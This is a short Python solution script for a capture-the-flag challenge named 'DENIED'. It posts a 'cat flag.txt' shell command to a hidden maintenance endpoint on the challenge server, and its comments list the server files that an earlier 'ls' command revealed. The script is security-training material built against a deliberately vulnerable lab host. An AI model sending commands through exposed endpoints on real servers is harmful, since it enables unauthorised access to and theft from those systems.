# DENIED - 75 points
#!/usr/bin/python3
import requests

url = "http://challenge.acictf.com:12133"
# x = requests.get(url + "/maintenance_foo_bar_deadbeef_12345.html")
# print(x.text)

myObj = {'cmd' : 'cat flag.txt'}
x = requests.post(url + "/secret_maintenance_foo_543212345", data = myObj)
print(x.text)

# Notes:
# 'ls' cmd produced:
# flag.txt
# robots.txt
# server.py
# static
# templates
# xinet_startup.sh